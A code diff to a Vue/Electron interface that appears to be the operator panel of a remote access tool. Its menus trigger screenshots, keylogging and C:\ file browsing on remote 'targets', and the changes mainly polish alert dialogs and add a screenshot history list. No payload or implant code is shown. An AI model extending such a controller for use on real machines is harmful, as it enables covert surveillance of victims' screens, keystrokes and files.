@@ -70,7 +70,6 @@ export default {
       }
       if (this.menus[index] === '屏幕截图') {
         this.getScreenShot()
-        // todo Screenshot
       }
       if (this.menus[index] === '键盘记录') {
         this.requestKeylogger()
@@ -101,6 +100,14 @@ export default {
       ipcRenderer.once('updateTargetList', (event, targetList) => {
         this.$store.commit('updateTargetList', targetList)
         this.changeCurrentTarget(targetList[index].uuid)
+        this.$store.commit('changeCurrentUUID', targetList[index].uuid)
+        this.$alert('成功刷新列表', {
+          confirmButtonText: '确定',
+          callback: action => {
+            let targetMenu = document.querySelector('#targetMenu')
+            targetMenu.style.display = 'none'
+          }
+        })
       })
       ipcRenderer.send('requestTargetList')
     },
@@ -160,7 +167,13 @@ export default {
      */
     disconnectTarget () {
       ipcRenderer.once('disconnected', (event, status) => {
-        alert('Vue:' + status)
+        this.$alert('已断开连接', {
+          confirmButtonText: '确定',
+          callback: action => {
+            let targetMenu = document.querySelector('#targetMenu')
+            targetMenu.style.display = 'none'
+          }
+        })
       })
       ipcRenderer.send('disconnect')
     },
@@ -170,6 +183,16 @@ export default {
      */
     getScreenShot () {
       ipcRenderer.once('ScreenShot', (event, url) => {
+        let screenshotName = url.split('\\')[url.split('\\').length-1]
+        let  date=new Date();
+        let  newdate=date.toLocaleString('chinese', { hour12: false });
+        let set = {
+          name: screenshotName,
+          time: newdate
+        }
+        console.log(set)
+        this.$store.commit('appendScreenshotList',set)
+        console.log(this.$store.state.screenshotList,1213)
         this.$alert('文件保存在：' + url, {
           confirmButtonText: '确定',
           callback: action => {
@@ -197,7 +220,13 @@ export default {
      */
     requestFilePreview (rootPath = 'C:\\') {
       ipcRenderer.once('filepreview', (event, filePreview) => {
-        alert('Vue:' + filePreview)
+        this.$alert('成功获取文件目录', {
+          confirmButtonText: '确定',
+          callback: action => {
+            let targetMenu = document.querySelector('#targetMenu')
+            targetMenu.style.display = 'none'
+          }
+        })
         let tmp = JSON.parse(filePreview)
         let filePath = tmp['position'].split('\\')
         console.log(filePath)
